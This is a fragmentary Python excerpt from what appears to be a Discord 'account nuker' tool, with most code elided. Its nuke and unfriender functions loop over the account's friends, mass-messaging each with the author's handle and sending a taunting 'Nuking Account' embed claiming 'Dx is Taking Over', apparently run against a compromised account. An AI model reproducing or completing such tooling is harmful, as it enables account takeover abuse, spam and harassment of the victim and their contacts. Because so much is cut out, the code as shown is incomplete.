...
def nuke():
    ...
    async def on_ready(times: int = 100):
        ...
        for user in bot.user.friends:
            try:
                await user.dm_channel.send('dx#1444')
...
def unfriender():
    ...
    async def on_ready():
        ...
        for user in bot.user.friends:
            try:
                embed=discord.Embed(title="Nuking Account", description="dx's Account Nuker <$", color=0x0000ff) 
                embed.set_author(name="Dx loves u <$") 
                embed.set_footer(text="Dx is Taking Over")
